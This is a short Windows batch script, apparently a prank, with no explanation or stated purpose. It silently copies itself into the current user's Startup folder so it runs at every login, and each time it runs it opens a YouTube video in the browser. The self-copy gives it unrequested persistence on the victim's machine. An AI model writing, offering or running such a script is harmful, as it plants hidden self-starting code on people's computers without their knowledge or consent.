@echo off
for /f "delims=: tokens=*" %%A in ('findstr /b ::: "%~f0"') do @echo(%%A


if exist "%userprofile%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/%~n0%~x0" (
start "" https://www.youtube.com/watch?v=zL24FTOhlk0
Pause>nul

) else (
copy /y %~f0 "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\"
start "" https://www.youtube.com/watch?v=zL24FTOhlk0
)
cls
